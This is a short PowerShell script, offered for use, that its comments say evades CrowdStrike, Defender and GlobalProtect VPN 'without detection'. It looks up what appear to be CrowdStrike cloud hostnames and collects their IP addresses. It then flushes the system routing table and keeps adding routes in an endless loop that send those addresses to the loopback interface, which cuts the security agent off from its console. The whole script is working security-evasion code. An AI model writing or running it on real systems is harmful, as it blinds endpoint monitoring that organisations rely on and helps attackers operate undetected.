# This can be used to bypass Crowdstrike, Defender, And Globalprotect full-tunnel VPNs without detection. 
# You'll need to add your own defender links to the target_URLs
# You'll also need to add your own addresses for Globalprotect VPNs, but it's verified to work. 
$target_URLs = @("ts01-gyr-maverick.cloudsink.net", "ts01-b.cloudsink.net", "lfodown01-gyr-maverick.cloudsink.net", "lfodown01-b.cloudsink.net")
$IPs =@()
$target_URLs | foreach-object {Invoke-WebRequest -TimeoutSec 1 -uri $_

    try{
        $datum = (get-dnsclientcache -entry $_ -ErrorAction Continue).data
    $IPs += $datum
    }
    catch{
    write-host ""
    
    }
}

$IPs

$InterfaceAlias = "*Loopback*"
route /f
# Get the loopback interface index
$InterfaceIndex = (Get-NetIPInterface | Where-Object {$_.InterfaceAlias -like $InterfaceAlias}).InterfaceIndex
while ($true){
    $IPs | ForEach-Object{
        $meesa = $_ + "/32"
        $meesa
        route add $_ mask 255.255.255.255 0.0.0.0 if $InterfaceIndex[0]
     }
            
}
